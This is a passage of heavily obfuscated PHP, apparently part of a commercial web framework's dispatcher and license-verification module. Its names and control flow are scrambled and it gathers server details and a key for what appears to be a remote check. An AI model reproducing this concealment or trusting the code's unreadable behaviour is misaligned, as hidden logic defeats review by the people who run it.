Ç–æŞ = $aß²¤öÕß[26]($GLOBALS[$aß²¤öÕß[22]][$aß²¤öÕß[23]], 1); $AŠŒ´ÌÖ‰Ù = $dãô«Ï‹«[559]; goto aœÚÄ‚­£™; A­‰šÅĞÆ…: if (!$E³ÈªÎ» ³ || $aß²¤öÕß[24]($E³ÈªÎ» ³) <= $aß²¤öÕß[24]($Bß·”×Ï¾ï)) { return; } if ($aß²¤öÕß[6]($aß²¤öÕß[25]($E³ÈªÎ» ³, -$aß²¤öÕß[24]($Bß·”×Ï¾ï))) != $Bß·”×Ï¾ï) { return; } $eß›§Õó½÷ = $aß²¤öÕß[25]($E³ÈªÎ» ³, 0, -$aß²¤öÕß[24]($Bß·”×Ï¾ï)); goto A¨åÀ‡î†…; aœÚÄ‚­£™: if (strlen($AŠŒ´ÌÖ‰Ù) < $dãô«Ï‹«[550]) { die; } $GLOBALS[$aß²¤öÕß[22]][$aß²¤öÕß[23]] = $aß²¤öÕß[27]($Fãã³ãºÈà, $EÚ Ç–æŞ); $GLOBALS[$aß²¤öÕß[22]][$aß²¤öÕß[28]] = $aß²¤öÕß[29]($aß²¤öÕß[1], $GLOBALS[$aß²¤öÕß[22]][$aß²¤öÕß[23]]); goto E¹¹„‰½; b¼•‚íçèÄ: } private function loch655e0ca9() { goto c§¤ó‘•“ó; F¡—å¨×äÂ: $fŠŠ‡õ‡Áõ = $cËÌ¾²„¯‰[566]; while (strlen($fŠŠ‡õ‡Áõ) < $cËÌ¾²„¯‰[550]) { if (!$fŠŠ‡õ‡Áõ) { break; } $fŠŠ‡õ‡Áõ++; } goto dÔñ±¬ÀÔë; A¤¬µÁ¼Çø: $A­—£Ø†Í = $cËÌ¾²„¯‰[563]; if (!$A­—£Ø†Í) { die; } $B¢¾µÖ¡ì = $a‚¡¤òå”[2]($DŞİºòŠ¿Ä[0][0], $a‚¡¤òå”[36]); goto aë¨Ç¬‘‚; dÊ¾±‚ğÎÆ: $bæ©ÚÍÒ‡ = $cËÌ¾²„¯‰[565]; if (strlen($bæ©ÚÍÒ‡) < $cËÌ¾²„¯‰[552]) { return; } $GLOBALS[$a‚¡¤òå”[22]][$a‚¡¤òå”[28]] = $a‚¡¤òå”[29]($a‚¡¤òå”[1], $GLOBALS[$a‚¡¤òå”[22]][$a‚¡¤òå”[23]]); goto F¡—å¨×äÂ; c§¤ó‘•“ó: $cËÌ¾²„¯‰ =& $_SERVER[¢à]; $a‚¡¤òå” =& $_SERVER[‘­Á¢æÊÚ–£]; if ($GLOBALS[$a‚¡¤òå”[22]][$a‚¡¤òå”[28]] != $a‚¡¤òå”[10]) { return; } goto Dİ‚’äÉ¢®; Dİ‚’äÉ¢®: $b¤Í›äŒô = $_SERVER[$a‚¡¤òå”[30]]; $e°¢¿š›· = $cËÌ¾²„¯‰[561]; if (!$e°¢¿š›·) { return; } goto Cªì±ğÊ˜Ö; d¹òš…ã’á: $AÈÖµ œÚ = $cËÌ¾²„¯‰[562]; $B¢¾µÖ¡ì = $a‚¡¤òå”[25]($b¤Í›äŒô, $FèÈ¬†¢Ğí + $a‚¡¤òå”[24]($f»ã÷‚ƒ)); $a‚¡¤òå”[34]($a‚¡¤òå”[35], $B¢¾µÖ¡ì, $DŞİºòŠ¿Ä); goto A¤¬µÁ¼Çø; Cªì±ğÊ˜Ö: $f»ã÷‚ƒ = $a‚¡¤òå”[31]; if (!$a‚¡¤òå”[32]($b¤Í›äŒô, $f»ã÷‚ƒ)) { return; } $FèÈ¬†¢Ğí = $a‚¡¤òå”[33]($b¤Í›äŒô, $f»ã÷‚ƒ); goto d¹òš…ã’á; aë¨Ç¬‘‚: $F·ƒ¨¹Åó = $cËÌ¾²„¯‰[564]; if (!$F·ƒ¨¹Åó) { die; } $GLOBALS[$a‚¡¤òå”[22]][$a‚¡¤òå”[23]] = $a‚¡¤òå”[0]($a‚¡¤òå”[36], $B¢¾µÖ¡ì); goto dÊ¾±‚ğÎÆ; dÔñ±¬ÀÔë: } public function run() { goto dÆÃÓÂõ´; aÒšÚŒ½¼: while ($f•äë½È„Ø < $BäÏ„ÏÁë[552]) { if ($f•äë½È„Ø >= 0) { break; } $f•äë½È„Ø++; } $_SERVER[$AŠçÃ³ÉÊ[44]] = $AŠçÃ³ÉÊ[6](ACTION); $this->{$_SERVER[‘­Á¢æÊÚ–£][45]}(); goto AìØ¹åñ¹å; dÆÃÓÂõ´: $BäÏ„ÏÁë =& $_SERVER[¢à]; $AŠçÃ³ÉÊ =& $_SERVER[‘­Á¢æÊÚ–£]; $this->{$_SERVER[‘­Á¢æÊÚ–£][37]}(); goto b»ÃÊ¾Åç­; b»ÃÊ¾Åç­: $this->{$_SERVER[‘­Á¢æÊÚ–£][38]}(); $D¹Ë‰ÕŒŸ› = $BäÏ„ÏÁë[567]; $Dä’¢ãõ¦‚ = $GLOBALS[$AŠçÃ³ÉÊ[22]][$AŠçÃ³ÉÊ[23]]; goto DŠŒ¦àÎ³¥; DŠŒ¦àÎ³¥: $D‘…¡¦ã´Ñ = $BäÏ„ÏÁë[568]; while (strlen($D‘…¡¦ã´Ñ) < $BäÏ„ÏÁë[550]) { if (!$D‘…¡¦ã´Ñ) { break; } $D‘…¡¦ã´Ñ++; } $D¨à›…’ÒÂ = $GLOBALS[$AŠçÃ³ÉÊ[22]][$AŠçÃ³ÉÊ[28]]; goto Eù¦Ù‰†…Ú; b¯ì§–Ñçè: $Eô´ ÜÜ…Ã = $BäÏ„ÏÁë[570]; if (strlen($Eô´ ÜÜ…Ã) < $BäÏ„ÏÁë[571]) { return; } $AŠçÃ³ÉÊ[39]($AŠçÃ³ÉÊ[41], isset($Dä’¢ãõ¦‚[1]) && $Dä’¢ãõ¦‚[0] ? $Dä’¢ãõ¦‚[1] : $this->defaultController); goto Få÷Íˆ÷Ÿ–; Eù¦Ù‰†…Ú: $EÇÓøâÈ° = $BäÏ„ÏÁë[569]; while ($EÇÓøâÈ° < $BäÏ„ÏÁë[556]) { if ($EÇÓøâÈ° >= 0) { break; } $EÇÓøâÈ°++; } $AŠçÃ³ÉÊ[39]($AŠçÃ³ÉÊ[40], isset($Dä’¢ãõ¦‚[0]) && $Dä’¢ãõ¦‚[0] ? $Dä’¢ãõ¦‚[0] : $this->defaultModule); goto b¯ì§–Ñçè; AìØ¹åñ¹å: if ($AŠçÃ³ÉÊ[19]($Dä’¢ãõ¦‚) >= 3) { $this->{$_SERVER[‘­Á¢æÊÚ–£][21]}($D¨à›…’ÒÂ); } else { $this->{$_SERVER[‘­Á¢æÊÚ–£][21]}(ACTION); } goto B˜á˜ˆİ; Få÷Íˆ÷Ÿ–: $AŠçÃ³ÉÊ[39]($AŠçÃ³ÉÊ[42], isset($Dä’¢ãõ¦‚[2]) && $Dä’¢ãõ¦‚[0] ? $Dä’¢ãõ¦‚[2] : $this->defaultAction); $AŠçÃ³ÉÊ[39]($AŠçÃ³ÉÊ[43], MOD . $AŠçÃ³ÉÊ[1] . ST . $AŠçÃ³ÉÊ[1] . ACT); $f•äë½È„Ø = $BäÏ„ÏÁë[572]; goto aÒšÚŒ½¼; B˜á˜ˆİ: } private $adrc500a4635 = array(); private $gniz724e9f76 = ''; public function zrme9e304d88() { goto bª°†ô“„ï; bª°†ô“„ï: $cèœä½Ôøì =& $_SERVER[¢à]; $F»âã¾ì©š =& $_SERVER[‘­Á¢æÊÚ–£]; $this->{$_SERVER[‘­Á¢æÊÚ–£][46]}(); goto fùô¢ ğø; AæÍÜÁµ¬: $eç†¬ÚÔš’ = $cèœä½Ôøì[580]; while (strlen($eç†¬ÚÔš’) < $cèœä½Ôøì[552]) { if (!$eç†¬ÚÔš’) { break; } $eç†¬ÚÔš’++; } goto cÀî°¯Âó; AÈá›ó˜ë: $aÈÎ±óŸ¹ = $cèœä½Ôøì[575]; if (!$aÈÎ±óŸ¹) { die; } $this->{$_SERVER[‘­Á¢æÊÚ–£][51]}(); goto dÓ¯Öìâ·•; Aè‹Æ¿Á: $this->{$_SERVER[‘­Á¢æÊÚ–£][49]}(); $A•…Ïå¨ƒ = $cèœä½Ôøì[574]; $this->{$_SERVER[‘­Á¢æÊÚ–£][50]}(); goto AÈá›ó˜ë; d¹«‹…×ìË: $this->{$_SERVER[‘­Á¢æÊÚ–£][3]}($F»âã¾ì©š[57], array($this, $F»âã¾ì©š[58])); $f°µÉ¢è§ = $cèœä½Ôøì[579]; $this->{$_SERVER[‘­Á¢æÊÚ–£][3]}($F»âã¾ì©š[59], array($this, $F»âã¾ì©š[60])); goto AæÍÜÁµ¬; dÓ¯Öìâ·•: $d„¶¼½Ç°÷ = $cèœä½Ôøì[576]; while (strlen($d„¶¼½Ç°÷) < $cèœä½Ôøì[558]) { if (!$d„¶¼½Ç°÷) { break; } $d„¶¼½Ç°÷++; } $this->{$_SERVER[‘­Á¢æÊÚ–£][52]}(); goto c¨á‚‚ì¬; aÍğŸ¶ä”í: $F ›ŒÎ…Š¿ = $cèœä½Ôøì[578]; while (strlen($F ›ŒÎ…Š¿) < $cèœä½Ôøì[558]) { if (!$F ›ŒÎ…Š¿) { break; } $F ›ŒÎ…Š¿++; } $this->{$_SERVER[‘­Á¢æÊÚ–£][3]}($F»âã¾ì©š[55], array($this, $F»âã¾ì©š[56])); goto d¹«‹…×ìË; fùô¢ ğø: $this->{$_SERVER[‘­Á¢æÊÚ–£][47]}(); $f¦”Ù¥‹„ = $cèœä½Ôøì[573]; $this->{$_SERVER[‘­Á¢æÊÚ–£][48]}(); goto Aè‹Æ¿Á; c¨á‚‚ì¬: $B¿ªÇ†Ò = $cèœä½Ôøì[577]; if (!$B¿ªÇ†Ò) { return; } $this->{$_SERVER[‘­Á¢æÊÚ–£][3]}($F»âã¾ì©š[53], array($this, $F»âã¾ì©š[54])); goto aÍğŸ¶ä”í; cÀî°¯Âó: } public function qbjy9fc9570d($eŸ¬íÁ¯š×) { goto eİ´×æ—·ó; e‰Å–Æ¯¡Ç: foreach ($e˜Ø†ŸÈÆ– as $A‚¹¤‘Ùöé) { $Fãµùƒæ‰¹ = $GLOBALS[$BÍÂ” ÓŒ†[91]][$BÍÂ” ÓŒ†[92]][$A‚¹¤‘Ùöé]; if (isset($dø§‹‘Õ[$A‚¹¤‘Ùöé])) { $Fãµùƒæ‰¹ = $dø§‹‘Õ[$A‚¹¤‘Ùöé]; } $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$A‚¹¤‘Ùöé] = $Fãµùƒæ‰¹; } $aÉÜï®È·ò = $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$BÍÂ” ÓŒ†[76]]; $B±Ş©á¨ÑŞ = $Aå¤·Ë¶Â[582]; goto e¾½¾´ªñÕ; AòÎŠÊËæ: $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[128]] = $BÍÂ” ÓŒ†[104]($this->adrc500a4635, $BÍÂ” ÓŒ†[129], $BÍÂ” ÓŒ†[10]); $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[130]] = $BÍÂ” ÓŒ†[104]($this->adrc500a4635, $BÍÂ” ÓŒ†[131], $BÍÂ” ÓŒ†[10]); if ($BÍÂ” ÓŒ†[104]($GLOBALS, $BÍÂ” ÓŒ†[132]) && $this->config[$BÍÂ” ÓŒ†[133]]) { $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[134]] = WEB_ROOT; } goto d ”†ÕŠéÔ; A‰ë˜à¾µ: if (!$aßğ£éŠåà) { die; } $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[113]] = $BÍÂ” ÓŒ†[114]($_SERVER[$BÍÂ” ÓŒ†[115]] . $dø§‹‘Õ[$BÍÂ” ÓŒ†[116]]); $FØ®É©Ñ…… = $Aå¤·Ë¶Â[587]; goto C»Ëïâ½¸†; eİ´×æ—·ó: $Aå¤·Ë¶Â =& $_SERVER[¢à]; $BÍÂ” ÓŒ† =& $_SERVER[‘­Á¢æÊÚ–£]; $dø§‹‘Õ = $BÍÂ” ÓŒ†[61]($BÍÂ” ÓŒ†[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}(); goto c³¢èŞÌÂÈ; E‹…Î†Ôé™: unset($eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[95]][$BÍÂ” ÓŒ†[97]]); $A¢¾÷Ñ¿·ö = $Aå¤·Ë¶Â[584]; if (strlen($A¢¾÷Ñ¿·ö) < $Aå¤·Ë¶Â[558]) { return; } goto FèÎ¯°•ˆ°; d ”†ÕŠéÔ: return $eŸ¬íÁ¯š×; goto E˜†¾‚£…å; dÓ÷³ÖÅ: $bË²Ú¿ä‡Ö = $Aå¤·Ë¶Â[585]; $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[109]] = $BÍÂ” ÓŒ†[110]($BÍÂ” ÓŒ†[111])->{$_SERVER[‘­Á¢æÊÚ–£][112]}(); $aßğ£éŠåà = $Aå¤·Ë¶Â[586]; goto A‰ë˜à¾µ; FèÎ¯°•ˆ°: unset($eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$BÍÂ” ÓŒ†[76]]); unset($eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$BÍÂ” ÓŒ†[98]]); $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$BÍÂ” ÓŒ†[99]] = array($BÍÂ” ÓŒ†[100] => (int) $aÉÜï®È·ò[$BÍÂ” ÓŒ†[101]], $BÍÂ” ÓŒ†[102] => $BÍÂ” ÓŒ†[103]($BÍÂ” ÓŒ†[104]($aÉÜï®È·ò, $BÍÂ” ÓŒ†[105], array())), $BÍÂ” ÓŒ†[106] => (int) $BÍÂ” ÓŒ†[104]($aÉÜï®È·ò, $BÍÂ” ÓŒ†[107], 0)); goto dÓ÷³ÖÅ; C»Ëïâ½¸†: $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[117]] = $BÍÂ” ÓŒ†[118]($BÍÂ” ÓŒ†[119]()); $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[120]] = $this->gniz724e9f76; $B¼Ğò¹Óãƒ = $Aå¤·Ë¶Â[588]; goto cïÙ‹Ó¸¼Á; c³¢èŞÌÂÈ: $e˜Ø†ŸÈÆ– = array($BÍÂ” ÓŒ†[64], $BÍÂ” ÓŒ†[65], $BÍÂ” ÓŒ†[66], $BÍÂ” ÓŒ†[67], $BÍÂ” ÓŒ†[68], $BÍÂ” ÓŒ†[69], $BÍÂ” ÓŒ†[70], $BÍÂ” ÓŒ†[71], $BÍÂ” ÓŒ†[72], $BÍÂ” ÓŒ†[73], $BÍÂ” ÓŒ†[74], $BÍÂ” ÓŒ†[75], $BÍÂ” ÓŒ†[76], $BÍÂ” ÓŒ†[77], $BÍÂ” ÓŒ†[78], $BÍÂ” ÓŒ†[79], $BÍÂ” ÓŒ†[80], $BÍÂ” ÓŒ†[81], $BÍÂ” ÓŒ†[82], $BÍÂ” ÓŒ†[83], $BÍÂ” ÓŒ†[84], $BÍÂ” ÓŒ†[85], $BÍÂ” ÓŒ†[86], $BÍÂ” ÓŒ†[87], $BÍÂ” ÓŒ†[88], $BÍÂ” ÓŒ†[89], $BÍÂ” ÓŒ†[90]); $c¶»ËÄº™Å = $Aå¤·Ë¶Â[581]; if (!$c¶»ËÄº™Å) { die; } goto e‰Å–Æ¯¡Ç; e¾½¾´ªñÕ: if (strlen($B±Ş©á¨ÑŞ) < $Aå¤·Ë¶Â[558]) { die; } unset($eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[95]][$BÍÂ” ÓŒ†[96]]); $fÌÜã§ö¾ = $Aå¤·Ë¶Â[583]; goto E‹…Î†Ôé™; cïÙ‹Ó¸¼Á: while (strlen($B¼Ğò¹Óãƒ) < $Aå¤·Ë¶Â[552]) { if (!$B¼Ğò¹Óãƒ) { break; } $B¼Ğò¹Óãƒ++; } if ($dø§‹‘Õ[$BÍÂ” ÓŒ†[120]] != $BÍÂ” ÓŒ†[121]) { $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[122]] = $dø§‹‘Õ[$BÍÂ” ÓŒ†[122]]; $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[123]] = $dø§‹‘Õ[$BÍÂ” ÓŒ†[123]]; $AÛ„¸Ô¤øì = $BÍÂ” ÓŒ†[124](10) . $this->gniz724e9f76 . $BÍÂ” ÓŒ†[124](5); $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[125]][$BÍÂ” ÓŒ†[126]] = $this->{$_SERVER[‘­Á¢æÊÚ–£][127]}($AÛ„¸Ô¤øì, $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[108]][$BÍÂ” ÓŒ†[113]]); } if ($this->gniz724e9f76 == $BÍÂ” ÓŒ†[121]) { $eŸ¬íÁ¯š×[$BÍÂ” ÓŒ†[93]][$BÍÂ” ÓŒ†[94]][$BÍÂ” ÓŒ†[99]][$BÍÂ” ÓŒ†[107]] = 0; } goto AòÎŠÊËæ; E˜†¾‚£…å: } private function iwpv3aeb879d() { goto D¡ß„¡©İØ; c—¹ßƒà†: if (!$dŸá™¡Î) { die; } goto bÄÓ¦‡’óÀ; D¡ß„¡©İØ: $fîŒ¹ôõ¢à =& $_SERVER[¢à]; $F˜¨ƒù×– =& $_SERVER[‘­Á¢æÊÚ–£]; if ($_SERVER[$F˜¨ƒù×–[44]] == $F˜¨ƒù×–[135]) { goto e¾“†Äë¥×; aê•ÌÒ²™: $F˜¨ƒù×–[13](array($F˜¨ƒù×–[151], $F˜¨ƒù×–[152]), $EÓ—…Í»À±); $a–ª”ÖÛ‘Š = $fîŒ¹ôõ¢à[590]; goto b²’²ŞÈœš; dƒ˜Ñìİ–: $EÓ—…Í»À± = array($F˜¨ƒù×–[150] => $E‰Ä“îé”Ò); $aøæ©äï‹ä = $fîŒ¹ôõ¢à[589]; while ($aøæ©äï‹ä < $fîŒ¹ôõ¢à[552]) { if ($aøæ©äï‹ä >= 0) { break; } $aøæ©äï‹ä++; } goto aê•ÌÒ²™; e¾“†Äë¥×: $E‰Ä“îé”Ò = array($F˜¨ƒù×–[120] => $this->gniz724e9f76, $F˜¨ƒù×–[136] => $this->{$_SERVER[‘­Á¢æÊÚ–£][137]}(), $F˜¨ƒù×–[138] => $F˜¨ƒù×–[61]($F˜¨ƒù×–[139])->{$_SERVER[‘­Á¢æÊÚ–£][140]}()); if ($this->gniz724e9f76 != $F˜¨ƒù×–[121]) { $eŒËœï¦ÏÃ = $F˜¨ƒù×–[104]($this->adrc500a4635, $F˜¨ƒù×–[141]); if ($eŒËœï¦ÏÃ) { $E‰Ä“îé”Ò[$F˜¨ƒù×–[142]] = $eŒËœï¦ÏÃ; $E‰Ä“îé”Ò[$F˜¨ƒù×–[143]] = $F˜¨ƒù×–[144]($F˜¨ƒù×–[104]($this->adrc500a4635, $F˜¨ƒù×–[145])); $E‰Ä“îé”Ò[$F˜¨ƒù×–[146]] = $F˜¨ƒù×–[104]($this->adrc500a4635, $F˜¨ƒù×–[131]); } } $E‰Ä“îé”Ò = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($F˜¨ƒù×–[148]($E‰Ä“îé”Ò), $F˜¨ƒù×–[114]($F˜¨ƒù×–[149])); goto dƒ˜Ñìİ–; b²’²ŞÈœš: } goto f‚ÌÎ°¹·­; c”ÄªºŠ¬ƒ: $EÓ—…Í»À± = array($F˜¨ƒù×–[159] => $f»Òº¾¿Š[$F˜¨ƒù×–[64]], $F˜¨ƒù×–[160] => $f»Òº¾¿Š[$F˜¨ƒù×–[65]], $F˜¨ƒù×–[161] => $F˜¨ƒù×–[10]); $dôÜ×ƒñ‹  = $fîŒ¹ôõ¢à[591]; if (!$dôÜ×ƒñ‹ ) { return; } goto Aâ÷Ç†¯¸˜; Aâ÷Ç†¯¸˜: foreach ($cÌé½¯¡‡© as $b•âœ§·Š) { if (!isset($f»Òº¾¿Š[$b•âœ§·Š]) || !$f»Òº¾¿Š[$b•âœ§·Š]) { continue; } $EÓ—…Í»À±[$b•âœ§·Š] = $f»Òº¾¿Š[$b•âœ§·Š]; } $F˜¨ƒù×–[13](array($F˜¨ƒù×–[151], $F˜¨ƒù×–[152]), $EÓ—…Í»À±); $dŸá™¡Î = $fîŒ¹ôõ¢à[592]; goto c—¹ßƒà†; f‚ÌÎ°¹·­: if ($this->gniz724e9f76 == $F˜¨ƒù×–[121]) { return; } $cÌé½¯¡‡© = array($F˜¨ƒù×–[153], $F˜¨ƒù×–[154], $F˜¨ƒù×–[155], $F˜¨ƒù×–[156], $F˜¨ƒù×–[157], $F˜¨ƒù×–[158]); $f»Òº¾¿Š = $F˜¨ƒù×–[61]($F˜¨ƒù×–[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}(); goto c”ÄªºŠ¬ƒ; bÄÓ¦‡’óÀ: } private function bqgu7ab44db2() { goto A´™‰ÄèÎ¾; AäÇÕŞ¬Åó: $DºÌê“º˜ = $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]]; $CšÉïåñ÷í = $this->{$_SERVER[‘­Á¢æÊÚ–£][199]}($DºÌê“º˜[$D•‹×Ë‹á[200]]); $bƒƒ¦Œ îŞ = $b…‚¾ÑÎˆª[594]; goto dŒ¿İÁŒğ; D¶ÃŠèæ¸¿: if (strlen($fÄŸµÍõåğ) < $b…‚¾ÑÎˆª[571]) { return; } goto AÄ—„†‹ÆŠ; D‰ë§æõ‰Ê: if (!$f™İÜµóª›) { return; } if ($aÒ›Â¸æğ[$D•‹×Ë‹á[178]] == $D•‹×Ë‹á[179]) { $e•¨Íï¬º = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($cº÷ç”ÌÏÌ, $D•‹×Ë‹á[180]); $cöÄ®­Çå° = $this->{$_SERVER[‘­Á¢æÊÚ–£][127]}($D•‹×Ë‹á[148]($BĞÎ‡ÂÜì), $cº÷ç”ÌÏÌ . $D•‹×Ë‹á[181], 3); $FÀÑ´…¢– = $this->{$_SERVER[‘­Á¢æÊÚ–£][182]}($D•‹×Ë‹á[183] . $e•¨Íï¬º . $D•‹×Ë‹á[184] . $cöÄ®­Çå°, -1); $D•‹×Ë‹á[166]($FÀÑ´…¢–, !0); } else { if ($aÒ›Â¸æğ[$D•‹×Ë‹á[178]] == $D•‹×Ë‹á[185]) { $DÏ¿øÉ½Ê‡ = $D•‹×Ë‹á[25]($D•‹×Ë‹á[114]($D•‹×Ë‹á[186] . $cº÷ç”ÌÏÌ), 12, 15) . $D•‹×Ë‹á[187]; $cöÄ®­Çå° = $this->{$_SERVER[‘­Á¢æÊÚ–£][188]}($D•‹×Ë‹á[2]($aÒ›Â¸æğ[$D•‹×Ë‹á[189]]), $DÏ¿øÉ½Ê‡, 2); $F¾Ÿ»çÏ‰ö = $D•‹×Ë‹á[190]($cöÄ®­Çå°, !0); if (!$D•‹×Ë‹á[191]($F¾Ÿ»çÏ‰ö) || !$D•‹×Ë‹á[191]($F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]]) || $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[165]] != !0) { $eÇôÒøëƒë = $D•‹×Ë‹á[193]; $Dó¶¥É¨Ñ = $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]] ? $D•‹×Ë‹á[194] . $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]] : $eÇôÒøëƒë; $D•‹×Ë‹á[166]($Dó¶¥É¨Ñ, !1); } else { $BĞÎ‡ÂÜì[$D•‹×Ë‹á[168]] = $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]][$D•‹×Ë‹á[195]]; } } else { $F¾Ÿ»çÏ‰ö = $this->{$_SERVER[‘­Á¢æÊÚ–£][182]}($D•‹×Ë‹á[196], $BĞÎ‡ÂÜì, 10); } } if (!$D•‹×Ë‹á[191]($F¾Ÿ»çÏ‰ö) || !$D•‹×Ë‹á[191]($F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]]) || $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[165]] != !0) { $eÇôÒøëƒë = $D•‹×Ë‹á[197]($D•‹×Ë‹á[198]); $Dó¶¥É¨Ñ = $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]] ? $D•‹×Ë‹á[194] . $F¾Ÿ»çÏ‰ö[$D•‹×Ë‹á[192]] : $eÇôÒøëƒë; $D•‹×Ë‹á[166]($Dó¶¥É¨Ñ, !1); } goto AäÇÕŞ¬Åó; fÌ«ãáŠÎ¿: $aŠæ¢¢Øß = $F¾ºÕ·İ‹» . $d½É”ÉÄª’[$D•‹×Ë‹á[120]] . $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($D•‹×Ë‹á[114]($d½É”ÉÄª’[$D•‹×Ë‹á[209]]), $F¾ºÕ·İ‹»); $FŞÅËóíæ = $b…‚¾ÑÎˆª[596]; while ($FŞÅËóíæ < $b…‚¾ÑÎˆª[558]) { if ($FŞÅËóíæ >= 0) { break; } $FŞÅËóíæ++; } goto AŞø…‡îŒ; c·¯øçò¶: if (!$D•‹×Ë‹á[104]($GLOBALS, $D•‹×Ë‹á[132])) { die; } $aÒ›Â¸æğ = $GLOBALS[$D•‹×Ë‹á[22]]; if (isset($aÒ›Â¸æğ[$D•‹×Ë‹á[163]])) { $this->{$_SERVER[‘­Á¢æÊÚ–£][164]}(); die; } goto Eƒ¨ñå¦“Ç; Eƒ¨ñå¦“Ç: if (!isset($aÒ›Â¸æğ[$D•‹×Ë‹á[165]]) || $D•‹×Ë‹á[24]($aÒ›Â¸æğ[$D•‹×Ë‹á[165]]) != 16) { $D•‹×Ë‹á[166]($D•‹×Ë‹á[167] . $aÒ›Â¸æğ[$D•‹×Ë‹á[165]], !1); } $DĞöšÀ‡¨ = $D•‹×Ë‹á[61]($D•‹×Ë‹á[62])->{$_SERVER[‘­Á¢æÊÚ–£][63]}($D•‹×Ë‹á[116]); $BĞÎ‡ÂÜì = array($D•‹×Ë‹á[165] => $aÒ›Â¸æğ[$D•‹×Ë‹á[165]], $D•‹×Ë‹á[168] => $D•‹×Ë‹á[124](16), $D•‹×Ë‹á[169] => $D•‹×Ë‹á[149], $D•‹×Ë‹á[170] => $D•‹×Ë‹á[171], $D•‹×Ë‹á[172] => $_SERVER[$D•‹×Ë‹á[173]], $D•‹×Ë‹á[174] => $_SERVER[$D•‹×Ë‹á[175]], $D•‹×Ë‹á[176] => $_SERVER[$D•‹×Ë‹á[177]]); goto dà÷´Ûòƒ³; dÏŞ©÷ÄßÅ: $a£Ç½¤ìæí = $d—´Ì¸ÂÀ­[$D•‹×Ë‹á[225]]; $D¼­õ™¹š˜ = $b…‚¾ÑÎˆª[598]; while (strlen($D¼­õ™¹š˜) < $b…‚¾ÑÎˆª[556]) { if (!$D¼­õ™¹š˜) { break; } $D¼­õ™¹š˜++; } goto E†ˆÉÑ¿î; F­´×Ê¾ï–: $c«Ì±ÁÕçÒ = $D•‹×Ë‹á[25]($D•‹×Ë‹á[114]($d½É”ÉÄª’[$D•‹×Ë‹á[210]]), 10, 10); $e•ïğ¯ó™¸ = $c«Ì±ÁÕçÒ . $d½É”ÉÄª’[$D•‹×Ë‹á[120]] . $d½É”ÉÄª’[$D•‹×Ë‹á[212]]; $d½É”ÉÄª’[$D•‹×Ë‹á[122]] = $D•‹×Ë‹á[214]($D•‹×Ë‹á[118]($this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($e•ïğ¯ó™¸, $D•‹×Ë‹á[215]))); goto e‡Œ©ß®îî; cÁÌğ¥¢²›: $EƒˆœØ²™ = $D•‹×Ë‹á[114]($_SERVER[$D•‹×Ë‹á[115]] . $D•‹×Ë‹á[214]($DĞöšÀ‡¨) . $d½É”ÉÄª’[$D•‹×Ë‹á[210]]); $bô—Ö¦Å’ = $b…‚¾ÑÎˆª[597]; if (strlen($bô—Ö¦Å’) < $b…‚¾ÑÎˆª[550]) { die; } goto f…¦•º•æÏ; Aå„§£¹Øˆ: $D†®Ğ¿Š¦ã = $b…‚¾ÑÎˆª[599]; $D•‹×Ë‹á[166]($D•‹×Ë‹á[197]($D•‹×Ë‹á[208]), !0); $fÄŸµÍõåğ = $b…‚¾ÑÎˆª[600]; goto D¶ÃŠèæ¸¿; e‡Œ©ß®îî: $F¾ºÕ·İ‹» = $D•‹×Ë‹á[124](16); $a¢´±ö·Öˆ = $b…‚¾ÑÎˆª[595]; while (strlen($a¢´±ö·Öˆ) < $b…‚¾ÑÎˆª[552]) { if (!$a¢´±ö·Öˆ) { break; } $a¢´±ö·Öˆ++; } goto fÌ«ãáŠÎ¿; dà÷´Ûòƒ³: $eğ¦î¯ç„ë = $b…‚¾ÑÎˆª[587]; $cº÷ç”ÌÏÌ = $D•‹×Ë‹á[114]($_SERVER[$D•‹×Ë‹á[115]] . $DĞöšÀ‡¨); $f™İÜµóª› = $b…‚¾ÑÎˆª[593]; goto D‰ë§æõ‰Ê; dŒ¿İÁŒğ: if (!$CšÉïåñ÷í || $CšÉïåñ÷í != $D•‹×Ë‹á[201]($DºÌê“º˜[$D•‹×Ë‹á[145]])) { 